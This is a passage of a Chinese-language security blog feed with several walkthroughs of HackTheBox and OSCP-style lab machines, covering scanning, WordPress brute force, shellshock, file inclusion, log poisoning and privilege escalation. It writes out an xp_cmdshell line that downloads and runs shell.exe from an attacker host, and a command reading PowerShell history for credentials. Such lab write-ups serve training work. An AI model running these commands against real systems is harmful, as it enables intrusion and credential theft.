plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EXEC xp_cmdshell &quot;powershell -c cd C:\Users\sql_svc\Downloads;wget http://10.10.16.58:8000/shell.exe -outfile shell.exe&quot;</span><br></pre></td></tr></table></figure><p><img src="/img/Hackthebox-Archetype/image-20240714185637204.png" alt="image-20240714185637204"></p><p>msf进行监听并执行shell.exe</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xp_cmdshell &quot;powershell -c cd C:\Users\sql_svc\Downloads; .\shell.exe&quot;</span><br></pre></td></tr></table></figure><p><img src="/img/Hackthebox-Archetype/image-20240714190034267.png" alt="image-20240714190034267"></p><p><img src="/img/Hackthebox-Archetype/image-20240714190112459.png" alt="image-20240714190112459"></p><h2 id="五、权限提升"><a href="#五、权限提升" class="headerlink" title="五、权限提升"></a>五、权限提升</h2><p>看下powershell 的历史命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt</span><br></pre></td></tr></table></figure><p><img src="/img/Hackthebox-Archetype/image-20240714192414862.png" alt="image-20240714192414862"></p><p>看到admininstrator 的密码 <code>MEGACORP_4dm1n!!</code></p><p>使用psexec 进行登陆连接</p><blockquote><p>PsExec 是一种轻型 telnet-replacement，可用于在其他系统上执行进程，无需手动安装客户端软件即可完成控制台应用程序的完整交互性。 PsExec 最强大的用途包括在远程系统和远程启用工具（如 IpConfig）上启动交互式命令提示符。psexec的使用不需要对方主机开机3389端口，只需要对方开启admin共享或c(该共享默认开启，依赖于445端口)。但是，假如目标主机开启了防火墙(因为防火墙默认禁止445端口的连接)，psexec也是不能使用的，会提示找不到网络路径。由于psexec是windows提供的工具，所以杀毒软件会将其添加到白名单中。</p></blockquote><p><img src="/img/Hackthebox-Archetype/image-20240714193342548.png" alt="image-20240714193342548"></p>]]></content>
      
      
      <categories>
          
          <category> Hackthebox系列靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hackthebox </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【OSCP系列】OSCP靶机—BTRsys-2.1</title>
      <link href="/2024/07/14/OSCP-BTRsys-2-1/"/>
      <url>/2024/07/14/OSCP-BTRsys-2-1/</url>
      
        <content type="html"><![CDATA[<h1 id="OSCP系列靶机—BTRsys-2-1"><a href="#OSCP系列靶机—BTRsys-2-1" class="headerlink" title="OSCP系列靶机—BTRsys-2.1"></a>OSCP系列靶机—BTRsys-2.1</h1><h2 id="一、主机发现"><a href="#一、主机发现" class="headerlink" title="一、主机发现"></a>一、主机发现</h2><p><img src="/img/OSCP-BTRsys-2-1/image-20240714120227641.png" alt="image-20240714120227641"></p><h2 id="二、端口扫描"><a href="#二、端口扫描" class="headerlink" title="二、端口扫描"></a>二、端口扫描</h2><p>1、快速扫描</p><p><img src="/img/OSCP-BTRsys-2-1/image-20240714120516228.png" alt="image-20240714120516228"></p><p>2、全端口扫描</p><p><img src="/img/OSCP-BTRsys-2-1/image-20240714121450552.png" alt="image-20240714121450552"></p><p>3、服务系统探测</p><p><img src="/img/OSCP-BTRsys-2-1/image-20240714121612617.png" alt="image-20240714121612617"></p><p>4、漏洞探测</p><p><img src="/img/OSCP-BTRsys-2-1/image-20240714122713884.png" alt="image-20240714122713884"></p><p>80端口扫到了一些目录，有wordpress框架和robots.txt 文件，以及易受DOS攻击</p><h2 id="三、ftp信息收集"><a href="#三、ftp信息收集" class="headerlink" title="三、ftp信息收集"></a>三、ftp信息收集</h2><p><img src="/img/OSCP-BTRsys-2-1/image-20240714123426992.png" alt="image-20240714123426992"></p><p>输入<code>binary</code>进入二进制模式</p><p><img src="/img/OSCP-BTRsys-2-1/image-20240714123541542.png" alt="image-20240714123541542"></p><p>啥也没有，肯定没这么容易；尝试文件上传</p><p><img src="/img/OSCP-BTRsys-2-1/image-20240714123756178.png" alt="image-20240714123756178"></p><p>也失败了，暂时收集到这里</p><h2 id="四、HTTP信息收集"><a href="#四、HTTP信息收集" class="headerlink" title="四、HTTP信息收集"></a>四、HTTP信息收集</h2><p>1、首页</p><p><img src="/img/OSCP-BTRsys-2-1/image-20240714123918510.png" alt="image-20240714123918510"></p><p><img src="/img/OSCP-BTRsys-2-1/image-20240714123931298.png" alt="image-20240714123931298"></p><p>2、目录扫描</p><p><img src="/img/OSCP-BTRsys-2-1/image-20240714124456779.png" alt="image-20240714124456779"></p><p>3、wordpress信息收集</p><p><img src="/img/OSCP-BTRsys-2-1/image-20240714124600748.png" alt="image-20240714124600748"></p><p>4、wpscan 扫描用户名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://192.168.31.69/wordpress/ --enumerate u </span><br></pre></td></tr></table></figure><p><img src="/img/OSCP-BTRsys-2-1/image-20240714124943626.png" alt="image-20240714124943626"></p><p>有<code>btrisk</code>和<code>admin</code>两个用户；<code>cewl </code>收集密码信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cewl http://192.168.31.69/wordpress/ -w pass.txt </span><br></pre></td></tr></table></figure><p>5、对收集的用户名进行爆破</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url &quot;http://192.168.31.69/wordpress/&quot; -P &quot;pass.txt&quot; --usernames user.txt</span><br></pre></td></tr></table></figure><p><img src="/img/OSCP-BTRsys-2-1/image-20240714125458846.png" alt="image-20240714125458846"></p><p>没有发现密码，使用其他的字典进行爆破</p><p><img src="/img/OSCP-BTRsys-2-1/image-20240714125935168.png" alt="image-20240714125935168"></p><p>找到admin 的密码admin</p><p><img src="/img/OSCP-BTRsys-2-1/image-20240714130018947.png" alt="image-20240714130018947"></p><p>登陆成功</p><h2 id="五、Getshell"><a href="#五、Getshell" class="headerlink" title="五、Getshell"></a>五、Getshell</h2><p>在后台对wordpress 的主题进行编辑</p><p><img src="/img/OSCP-BTRsys-2-1/image-20240714132617563.png" alt="image-20240714132617563"></p><p><img src="/img/OSCP-BTRsys-2-1/image-20240714132623180.png" alt="image-20240714132623180"></p><p>改成php反弹shell代码进行监听</p><p><img src="/img/OSCP-BTRsys-2-1/image-20240714132800786.png" alt="image-20240714132800786"></p><p>获取shell</p><h2 id="六、权限提升"><a href="#六、权限提升" class="headerlink" title="六、权限提升"></a>六、权限提升</h2><h3 id="1、提权到btrisk"><a href="#1、提权到btrisk" class="headerlink" title="1、提权到btrisk"></a>1、提权到btrisk</h3><p>1、信息收集</p><p>查看历史命令的时候发现了数据库root 的密码</p><p><img src="/img/OSCP-BTRsys-2-1/image-20240714134159018.png" alt="image-20240714134159018"></p><p>2、数据库查看</p><p><img src="/img/OSCP-BTRsys-2-1/image-20240714134324611.png" alt="image-20240714134324611"></p><p>对<code>wordpress</code>数据库进行查看</p><p><img src="/img/OSCP-BTRsys-2-1/image-20240714134534395.png" alt="image-20240714134534395"></p><p>这个<code>btrisk</code>跟靶机中普通用户的名字一样，密码进行md5解密</p><p><img src="/img/OSCP-BTRsys-2-1/image-20240714134656488.png" alt="image-20240714134656488"></p><p>ssh连接，提权到<code>btrisk</code></p><p><img src="/img/OSCP-BTRsys-2-1/image-20240714134810020.png" alt="image-20240714134810020"></p><h3 id="2、提权到root"><a href="#2、提权到root" class="headerlink" title="2、提权到root"></a>2、提权到root</h3><p>sudo滥用提权</p><p><img src="/img/OSCP-BTRsys-2-1/image-20240714135143513.png" alt="image-20240714135143513"></p>]]></content>
      
      
      <categories>
          
          <category> OSCP系列靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> oscp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【OSCP系列】OSCP靶机—Sumo</title>
      <link href="/2024/07/13/OSCP-Sumo/"/>
      <url>/2024/07/13/OSCP-Sumo/</url>
      
        <content type="html"><![CDATA[<h1 id="【OSCP系列】OSCP靶机—Sumo"><a href="#【OSCP系列】OSCP靶机—Sumo" class="headerlink" title="【OSCP系列】OSCP靶机—Sumo"></a>【OSCP系列】OSCP靶机—Sumo</h1><h2 id="一、主机发现"><a href="#一、主机发现" class="headerlink" title="一、主机发现"></a>一、主机发现</h2><p><img src="/img/OSCP-Sumo/image-20240713200918079.png" alt="image-20240713200918079"></p><h2 id="二、端口扫描"><a href="#二、端口扫描" class="headerlink" title="二、端口扫描"></a>二、端口扫描</h2><p>1、快速扫描</p><p><img src="/img/OSCP-Sumo/image-20240713201007493.png" alt="image-20240713201007493"></p><p>2、全端口扫描</p><p><img src="/img/OSCP-Sumo/image-20240713201102130.png" alt="image-20240713201102130"></p><p>3、开放端口的服务信息</p><p><img src="/img/OSCP-Sumo/image-20240713201256990.png" alt="image-20240713201256990"></p><p>4、开放端口的漏洞信息</p><p><img src="/img/OSCP-Sumo/image-20240713201755990.png" alt="image-20240713201755990"></p><p>80端口受dos攻击影响</p><h2 id="三、HTTP信息收集"><a href="#三、HTTP信息收集" class="headerlink" title="三、HTTP信息收集"></a>三、HTTP信息收集</h2><p>1、源代码查看</p><p><img src="/img/OSCP-Sumo/image-20240713201721364.png" alt="image-20240713201721364"></p><p><img src="/img/OSCP-Sumo/image-20240713201740102.png" alt="image-20240713201740102"></p><p>没啥信息</p><p>2、目录扫描</p><p><img src="/img/OSCP-Sumo/image-20240713201656130.png" alt="image-20240713201656130"></p><p>没结果，准备个大字典</p><p><img src="/img/OSCP-Sumo/image-20240713202824335.png" alt="image-20240713202824335"></p><p><img src="/img/OSCP-Sumo/image-20240713203549284.png" alt="image-20240713203549284"></p><p>大字典跑完了依然没结果</p><p>3、使用漏洞探测器</p><p>使用轻巧型扫描器 nikto 进行扫描，发现shellshock 漏洞</p><p><img src="/img/OSCP-Sumo/image-20240713203714112.png" alt="image-20240713203714112"></p><p>看下解释</p><p><img src="/img/OSCP-Sumo/image-20240713203841473.png" alt="image-20240713203841473"></p><h2 id="四、Getshell"><a href="#四、Getshell" class="headerlink" title="四、Getshell"></a>四、Getshell</h2><p>查找有关该漏洞的利用</p><p><img src="/img/OSCP-Sumo/image-20240713203945197.png" alt="image-20240713203945197"></p><p>有很多msf 内置的利用方式，去msf查找</p><p><img src="/img/OSCP-Sumo/image-20240713204214469.png" alt="image-20240713204214469"></p><p>确实有很多；在端口扫描中，发现80端口是apache服务，因此选择编号为1 的，更贴切apache</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set rhosts 192.168.31.68</span><br><span class="line">set TARGETURI /cgi-bin/test.sh</span><br></pre></td></tr></table></figure><blockquote><p>这里rhosts 是靶机ip，TARGETURI 是nikto 识别出来的路径</p><p>lhost、lport 可以不用动，默认是本机IP跟端口，如果不是需要修改</p></blockquote><p><img src="/img/OSCP-Sumo/image-20240713205310315.png" alt="image-20240713205310315"></p><p>成功获取shell</p><h2 id="五、权限提升"><a href="#五、权限提升" class="headerlink" title="五、权限提升"></a>五、权限提升</h2><p>1、用户信息收集</p><p><img src="/img/OSCP-Sumo/image-20240713205441368.png" alt="image-20240713205441368"></p><p>只有一个<code>sumo</code>用户</p><p><img src="/img/OSCP-Sumo/image-20240713210829250.png" alt="image-20240713210829250"></p><p>啥也米有</p><p>2、高权限文件</p><p><img src="/img/OSCP-Sumo/image-20240713211017228.png" alt="image-20240713211017228"></p><p>啥也没有</p><p>3、脏牛提权</p><p>查看内核版本，版本较低，尝试脏牛提权</p><p><img src="/img/OSCP-Sumo/image-20240713211408827.png" alt="image-20240713211408827"></p><p>查找提权脚本</p><p><img src="/img/OSCP-Sumo/image-20240713212145891.png" alt="image-20240713212145891"></p><p>对该cpp文件在本地进行编译</p><p><img src="/img/OSCP-Sumo/image-20240713212454223.png" alt="image-20240713212454223"></p><p>通过python开启的http服务，上传到靶机</p><p><img src="/img/OSCP-Sumo/image-20240713212531447.png" alt="image-20240713212531447"></p><p>之后添加执行权限并执行</p><p><img src="/img/OSCP-Sumo/image-20240713212717174.png" alt="image-20240713212717174"></p><p>提权失败</p><p>4、脏牛提权其他姿势</p><p><img src="/img/OSCP-Sumo/image-20240713212805575.png" alt="image-20240713212805575"></p><p>查看编译语句</p><p><img src="/img/OSCP-Sumo/image-20240713212958765.png" alt="image-20240713212958765"></p><p>上传到靶机进行编译执行</p><p><img src="/img/OSCP-Sumo/image-20240713214237675.png" alt="image-20240713214237675"></p><p>用ssh连接提权到root</p><p><img src="/img/OSCP-Sumo/image-20240713214351227.png" alt="image-20240713214351227"></p>]]></content>
      
      
      <categories>
          
          <category> OSCP系列靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> oscp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【OSCP系列】OSCP靶机—Photographer</title>
      <link href="/2024/07/01/OSCP-Photographer/"/>
      <url>/2024/07/01/OSCP-Photographer/</url>
      
        <content type="html"><![CDATA[<h1 id="【OSCP系列】OSCP靶机—Photographer"><a href="#【OSCP系列】OSCP靶机—Photographer" class="headerlink" title="【OSCP系列】OSCP靶机—Photographer"></a>【OSCP系列】OSCP靶机—Photographer</h1><h2 id="一、主机发现"><a href="#一、主机发现" class="headerlink" title="一、主机发现"></a>一、主机发现</h2><p><img src="/img/OSCP-Photographer/image-20240630231520178.png" alt="image-20240630231520178"></p><h2 id="二、端口发现"><a href="#二、端口发现" class="headerlink" title="二、端口发现"></a>二、端口发现</h2><h3 id="1、快速扫描"><a href="#1、快速扫描" class="headerlink" title="1、快速扫描"></a>1、快速扫描</h3><p><img src="/img/OSCP-Photographer/image-20240630231559152.png" alt="image-20240630231559152"></p><h3 id="2、全端口扫描"><a href="#2、全端口扫描" class="headerlink" title="2、全端口扫描"></a>2、全端口扫描</h3><p><img src="/img/OSCP-Photographer/image-20240630231658308.png" alt="image-20240630231658308"></p><p><img src="/img/OSCP-Photographer/image-20240630231833186.png" alt="image-20240630231833186"></p><h3 id="3、服务版本探测"><a href="#3、服务版本探测" class="headerlink" title="3、服务版本探测"></a>3、服务版本探测</h3><p><img src="/img/OSCP-Photographer/image-20240630232036370.png" alt="image-20240630232036370"></p><p>80是HTTP服务，139、445是Samba服务，8000也是一个HTTP服务，推测服务器是Linux</p><h3 id="4、端口漏洞探测"><a href="#4、端口漏洞探测" class="headerlink" title="4、端口漏洞探测"></a>4、端口漏洞探测</h3><p><img src="/img/OSCP-Photographer/image-20240630232750568.png" alt="image-20240630232750568"></p><p><img src="/img/OSCP-Photographer/image-20240630233029884.png" alt="image-20240630233029884"></p><p><img src="/img/OSCP-Photographer/image-20240630233128877.png" alt="image-20240630233128877"></p><p>80端口发现了一个可能的SQL漏洞，还有一个csrf漏洞；8000端口发现了几个目录；针对windows 2000有一个smb的拒绝服务攻击</p><h2 id="三、HTTP信息收集"><a href="#三、HTTP信息收集" class="headerlink" title="三、HTTP信息收集"></a>三、HTTP信息收集</h2><h3 id="1、80端口信息收集"><a href="#1、80端口信息收集" class="headerlink" title="1、80端口信息收集"></a>1、80端口信息收集</h3><p>虽然nmap在这个端口发现了一个sql漏洞，但是看那个链接都感觉不太行。还是正紧来吧，看首页</p><p><img src="/img/OSCP-Photographer/image-20240630233635378.png" alt="image-20240630233635378"></p><p>简单看了一下，都是静态页面，先转向8000端口</p><h3 id="2、8000端口信息收集"><a href="#2、8000端口信息收集" class="headerlink" title="2、8000端口信息收集"></a>2、8000端口信息收集</h3><p>这个页面有大大的问题啊</p><p><img src="/img/OSCP-Photographer/image-20240701002335801.png" alt="image-20240701002335801"></p><p>点那个<code>Download File</code>，居然显示了下面<code>shell.php</code>文件的报错信息</p><p><img src="/img/OSCP-Photographer/image-20240701004701807.png" alt="image-20240701004701807"></p><p>疑似某种连接未连接上，搜索这个网站的cms漏洞信息</p><p><img src="/img/OSCP-Photographer/image-20240701004955250.png" alt="image-20240701004955250"></p><p>存在任意文件上传；在这个脚本中也是给了操作的步骤</p><p><img src="/img/OSCP-Photographer/image-20240701005144564.png" alt="image-20240701005144564"></p><p>在第3步中进行上传，在给定的页面中没有找到上传点，只好目录爆破</p><p><img src="/img/OSCP-Photographer/image-20240701005632604.png" alt="image-20240701005632604"></p><p>存在<code>/admin</code>目录，是我们没有搜索的</p><p><img src="/img/OSCP-Photographer/image-20240701005852241.png" alt="image-20240701005852241"></p><p>是一个后台登陆页，这里也是一直没有登陆上，先暂时放弃这里</p><h2 id="四、SMB信息收集"><a href="#四、SMB信息收集" class="headerlink" title="四、SMB信息收集"></a>四、SMB信息收集</h2><p>之后我们将重点放在剩下的smb服务上</p><p><img src="/img/OSCP-Photographer/image-20240701010534865.png" alt="image-20240701010534865"></p><p>连接<code>sambashre</code></p><p><img src="/img/OSCP-Photographer/image-20240701010554998.png" alt="image-20240701010554998"></p><p>这里我只下载了<code>mailsent.txt</code>文件，剩下的那个<code>wordpress.bkp.zip</code>疑似是备份文件，但是文件太大了，暂时先不下载</p><p><img src="/img/OSCP-Photographer/image-20240701010652634.png" alt="image-20240701010652634"></p><p><code>mailsent.txt</code>文件是一份信，大致的内容是<code>agi@photographer.com</code>给<code>daisa@photographer.com</code>写的一份信，信的内容给了一个密码的提示，但是密码的内容呢？？？是<code>my babygirl ;)</code>其中的一部分吗？</p><p>这里没有文件包含，所以暂时不通过smb上传文件了</p><h2 id="五、Getshell"><a href="#五、Getshell" class="headerlink" title="五、Getshell"></a>五、Getshell</h2><p>通过smb拿到的用户名和密码，去8000登录页试一试。多次尝试之后<code>daisa@photographer.com/babygirl</code>是账号密码，登陆成功</p><p><img src="/img/OSCP-Photographer/image-20240701011553790.png" alt="image-20240701011553790"></p><p>同时，根据先前的提示，这里应该是任意文件上传的地方，抓包上传；根据提示，需要修改两处地方</p><p><img src="/img/OSCP-Photographer/image-20240701011810633.png" alt="image-20240701011810633"></p><p> 在首页会显示我们刚刚上传的文件</p><p><img src="/img/OSCP-Photographer/image-20240701011947837.png" alt="image-20240701011947837"></p><p>执行成功</p><p><img src="/img/OSCP-Photographer/image-20240701012009739.png" alt="image-20240701012009739"></p><p>利用python3进行反弹shell</p><p><img src="/img/OSCP-Photographer/image-20240701012453411.png" alt="image-20240701012453411"></p><p><img src="/img/OSCP-Photographer/image-20240701012510104.png" alt="image-20240701012510104"></p><h2 id="六、权限提升"><a href="#六、权限提升" class="headerlink" title="六、权限提升"></a>六、权限提升</h2><p>查找一下SUID文件</p><p><img src="/img/OSCP-Photographer/image-20240701012809586.png" alt="image-20240701012809586"></p><p><img src="/img/OSCP-Photographer/image-20240701012943821.png" alt="image-20240701012943821"></p><p>利用一句话直接提权</p><p><img src="/img/OSCP-Photographer/image-20240701013113227.png" alt="image-20240701013113227"></p>]]></content>
      
      
      <categories>
          
          <category> OSCP系列靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> OSCP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【OSCP系列】OSCP靶机—Ha-natraj</title>
      <link href="/2024/06/30/OSCP-Ha-natraj/"/>
      <url>/2024/06/30/OSCP-Ha-natraj/</url>
      
        <content type="html"><![CDATA[<h1 id="【OSCP系列】OSCP靶机—Ha-natraj"><a href="#【OSCP系列】OSCP靶机—Ha-natraj" class="headerlink" title="【OSCP系列】OSCP靶机—Ha-natraj"></a>【OSCP系列】OSCP靶机—Ha-natraj</h1><h2 id="一、主机发现"><a href="#一、主机发现" class="headerlink" title="一、主机发现"></a>一、主机发现</h2><p><img src="/img/OSCP-Ha-natraj/image-20240630145606754.png" alt="image-20240630145606754"></p><h2 id="二、端口扫描"><a href="#二、端口扫描" class="headerlink" title="二、端口扫描"></a>二、端口扫描</h2><h3 id="1、快速扫描"><a href="#1、快速扫描" class="headerlink" title="1、快速扫描"></a>1、快速扫描</h3><p><img src="/img/OSCP-Ha-natraj/image-20240630145644330.png" alt="image-20240630145644330"></p><h3 id="2、全端口扫描"><a href="#2、全端口扫描" class="headerlink" title="2、全端口扫描"></a>2、全端口扫描</h3><p><img src="/img/OSCP-Ha-natraj/image-20240630145713927.png" alt="image-20240630145713927"></p><p><img src="/img/OSCP-Ha-natraj/image-20240630145929111.png" alt="image-20240630145929111"></p><h3 id="3、服务版本探测"><a href="#3、服务版本探测" class="headerlink" title="3、服务版本探测"></a>3、服务版本探测</h3><p><img src="/img/OSCP-Ha-natraj/image-20240630145940567.png" alt="image-20240630145940567"></p><p>正常的ssh服务和http服务，是Ubuntu系统</p><h3 id="4、漏洞探测"><a href="#4、漏洞探测" class="headerlink" title="4、漏洞探测"></a>4、漏洞探测</h3><p><img src="/img/OSCP-Ha-natraj/image-20240630150326003.png" alt="image-20240630150326003"></p><p>发现了<code>console</code>和<code>images</code>目录</p><h2 id="三、HTTP信息收集"><a href="#三、HTTP信息收集" class="headerlink" title="三、HTTP信息收集"></a>三、HTTP信息收集</h2><p>先对首页展开调查</p><p><img src="/img/OSCP-Ha-natraj/image-20240630150231216.png" alt="image-20240630150231216"></p><p>大致都是对这位<code>Nataraj</code>的印度神进行了讲述，并无有价值的东西</p><p>看下nmap扫描出来的<code>console</code>目录，这个目录的名字我们还是很感兴趣的</p><p><img src="/img/OSCP-Ha-natraj/image-20240630150457085.png" alt="image-20240630150457085"></p><p>噢，有个<code>file.php</code>，是个很好的点</p><p><img src="/img/OSCP-Ha-natraj/image-20240630150525571.png" alt="image-20240630150525571"></p><p>一片空白？我们FUZZ试试</p><p><img src="/img/OSCP-Ha-natraj/image-20240630153904848.png" alt="image-20240630153904848"></p><p>有<code>file</code>参数，成功挖掘到一个漏洞</p><p><img src="/img/OSCP-Ha-natraj/image-20240630153948936.png" alt="image-20240630153948936"></p><h2 id="四、Getshell"><a href="#四、Getshell" class="headerlink" title="四、Getshell"></a>四、Getshell</h2><p>在上面的<code>/etc/passwd</code>文件中发现两个用户名</p><p><img src="/img/OSCP-Ha-natraj/image-20240630154056230.png" alt="image-20240630154056230"></p><p>PHP伪协议读取这个<code>file.php</code>文件内容</p><p><img src="/img/OSCP-Ha-natraj/image-20240630154321835.png" alt="image-20240630154321835"></p><p>目前只有一个任意文件包含漏洞；能想到的有日志文件包含</p><p>本想包含一下apache 的日志，但是是个空白</p><p><img src="/img/OSCP-Ha-natraj/image-20240630155240403.png" alt="image-20240630155240403"></p><p>转去包含其他日志去；Ubuntu 的登陆日志在<code>/var/log/auth.log</code></p><p><img src="/img/OSCP-Ha-natraj/image-20240630155356137.png" alt="image-20240630155356137"></p><p>OK，有登录日志；那利用ssh登陆，写入webshell；这里用了很多方法，均未成功，最终使用如下方法</p><p><img src="/img/OSCP-Ha-natraj/image-20240630163039088.png" alt="image-20240630163039088"></p><p>连接成功（如果失败，可以重置靶场环境多尝试）</p><p><img src="/img/OSCP-Ha-natraj/image-20240630164930178.png" alt="image-20240630164930178"></p><p>将shell反弹到nc上</p><p><img src="/img/OSCP-Ha-natraj/image-20240630165307264.png" alt="image-20240630165307264"></p><h2 id="五、权限提升"><a href="#五、权限提升" class="headerlink" title="五、权限提升"></a>五、权限提升</h2><h3 id="1、提权至mahakal"><a href="#1、提权至mahakal" class="headerlink" title="1、提权至mahakal"></a>1、提权至mahakal</h3><p>看到apache可以sudo 开启暂停，之后查找apache相关可操作的关键性文件</p><p><img src="/img/OSCP-Ha-natraj/image-20240630175107120.png" alt="image-20240630175107120"></p><p>通过修改apache的运行用户，达到提权，但是这里需要简单说明一下</p><blockquote><p>这里不能修改成root，apache默认不允许root启动，如果要root启动，需要添加“-DBIG_SECURITY_HOLE”到CFLAGS环境变量中重新编译</p></blockquote><p>因此，只能选择root之外的普通用户；记得把前面的注释掉</p><p><img src="/img/OSCP-Ha-natraj/image-20240630180950251.png" alt="image-20240630180950251"></p><p>保存配置文件，重启服务器，然后重新连接shell，拿到<code>mahakal</code>用户的权限（注意多等待会，apache重启需要时间）</p><p><img src="/img/OSCP-Ha-natraj/image-20240630181618663.png" alt="image-20240630181618663"></p><h3 id="2、提权至root"><a href="#2、提权至root" class="headerlink" title="2、提权至root"></a>2、提权至root</h3><p>之后反弹shell，查看sudo</p><p><img src="/img/OSCP-Ha-natraj/image-20240630181739763.png" alt="image-20240630181739763"></p><p>nmap的sudo提权方法</p><p><img src="/img/OSCP-Ha-natraj/image-20240630181828812.png" alt="image-20240630181828812">查看nmap 的版本</p><p><img src="/img/OSCP-Ha-natraj/image-20240630181939177.png" alt="image-20240630181939177"></p><p>高于5.21，只能用第一种方法</p><p><img src="/img/OSCP-Ha-natraj/image-20240630182126028.png" alt="image-20240630182126028"></p><p>提取成功</p>]]></content>
      
      
      <categories>
          
          <category> OSCP系列靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> oscp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【OSCP系列】OSCP靶机-driftingblues7_vh</title>
      <link href="/2024/06/28/OSCP-driftingblues7-vh/"/>
      <url>/2024/06/28/OSCP-driftingblues7-vh/</url>
      
        <content type="html"><![CDATA[<h1 id="【OSCP系列】OSCP靶机—driftingblues7-vh"><a href="#【OSCP系列】OSCP靶机—driftingblues7-vh" class="headerlink" title="【OSCP系列】OSCP靶机—driftingblues7_vh"></a>【OSCP系列】OSCP靶机—driftingblues7_vh</h1><h2 id="一、主机发现"><a href="#一、主机发现" class="headerlink" title="一、主机发现"></a>一、主机发现</h2><p><img src="/img/OSCP-driftingblues7-vh/image-20240628211809756.png" alt="image-20240628211809756"></p><h2 id="二、端口扫描"><a href="#二、端口扫描" class="headerlink" title="二、端口扫描"></a>二、端口扫描</h2><h3 id="1、快速扫描"><a href="#1、快速扫描" class="headerlink" title="1、快速扫描"></a>1、快速扫描</h3><p><img src="/img/OSCP-driftingblues7-vh/image-20240628211852272.png" alt="image-20240628211852272"></p><h3 id="2、全端口扫描"><a href="#2、全端口扫描" class="headerlink" title="2、全端口扫描"></a>2、全端口扫描</h3><p><img src="/img/OSCP-driftingblues7-vh/image-20240628212125320.png" alt="image-20240628212125320"></p><h3 id="3、版本系统探测"><a href="#3、版本系统探测" class="headerlink" title="3、版本系统探测"></a>3、版本系统探测</h3><p><img src="/img/OSCP-driftingblues7-vh/image-20240628212534300.png" alt="image-20240628212534300"></p><p>66端口是个python开放的http服务，80端口是http服务，但是重定向到了443的https服务，443是https服务，2403开放了一个端口，<code>taskmaster2000?</code>是一个未知的服务，3306是mysql服务，8086也是一个http服务</p><h3 id="4、端口漏洞探测"><a href="#4、端口漏洞探测" class="headerlink" title="4、端口漏洞探测"></a>4、端口漏洞探测</h3><p><img src="/img/OSCP-driftingblues7-vh/image-20240628212544334.png" alt="image-20240628212544334"></p><p>在443发现了一个可能的csrf漏洞</p><h2 id="三、HTTP信息收集"><a href="#三、HTTP信息收集" class="headerlink" title="三、HTTP信息收集"></a>三、HTTP信息收集</h2><h3 id="1、66端口信息收集"><a href="#1、66端口信息收集" class="headerlink" title="1、66端口信息收集"></a>1、66端口信息收集</h3><p>先对66端口的http服务下刀</p><p>看一下源代码</p><p><img src="/img/OSCP-driftingblues7-vh/image-20240628221237089.png" alt="image-20240628221237089"></p><p>由本地的js文件，看这个<code>index_files/</code>目录，存在目录穿越</p><p><img src="/img/OSCP-driftingblues7-vh/image-20240628221254258.png" alt="image-20240628221254258"></p><p>对66端口扫一下</p><p><img src="/img/OSCP-driftingblues7-vh/image-20240628221157433.png" alt="image-20240628221157433"></p><p>啊嘞，<code>.bash_history</code>文件，这是某个用户的家目录吗？</p><p><img src="/img/OSCP-driftingblues7-vh/image-20240628221528945.png" alt="image-20240628221528945"></p><p>我们对<code>/etc/hosts</code>文件很感兴趣，以及<code>flag.txt</code>文件，这里先记录下来这些文件</p><p>继续看<code>.bash_profile</code>文件，这里对这个文件做简单的介绍</p><blockquote><p>.bash_prfile 文件是用户登陆之后初始化的文件。即当用户登陆之后，会先执行这个文件的内容，很多时候这个文件会被黑客写入反弹命令，从而成为一种权限维持的手段</p></blockquote><p><img src="/img/OSCP-driftingblues7-vh/image-20240628222337276.png" alt="image-20240628222337276"></p><p>这里只是在原先的PATH路径上加上了家目录下的<code>/bin</code>目录，并重新加载PATH</p><p>看之后的<code>.cshrc</code>文件，<code>alias</code>做了一些别名设置</p><p><img src="/img/OSCP-driftingblues7-vh/image-20240628222636891.png" alt="image-20240628222636891"></p><p>之后看<code>flag.txt</code>文件，没啥用昂</p><p><img src="/img/OSCP-driftingblues7-vh/image-20240628222609072.png" alt="image-20240628222609072"></p><p>继续完后看，<code>.pki</code>目录啥也没有</p><p><img src="/img/OSCP-driftingblues7-vh/image-20240628222926970.png" alt="image-20240628222926970"></p><p><code>index_files</code>目录下我们在浏览器看过的，有很多js 文件</p><p><img src="/img/OSCP-driftingblues7-vh/image-20240628223001531.png" alt="image-20240628223001531"></p><h3 id="2、80、443端口信息收集"><a href="#2、80、443端口信息收集" class="headerlink" title="2、80、443端口信息收集"></a>2、80、443端口信息收集</h3><p>我们打开80端口就跳转到了443</p><p><img src="/img/OSCP-driftingblues7-vh/image-20240628223058805.png" alt="image-20240628223058805"></p><p>展开一个目录扫描，只要200，因为大都302跳转到登陆页面了</p><p><img src="/img/OSCP-driftingblues7-vh/image-20240628223835494.png" alt="image-20240628223835494"></p><p>看<code>README.md</code>文件内容</p><p><img src="/img/OSCP-driftingblues7-vh/image-20240628224039258.png" alt="image-20240628224039258"></p><p>这提示不就来了，查了一下<code>EyesOfNetwork</code>的信息</p><blockquote><p>“EyesOfNetwork” 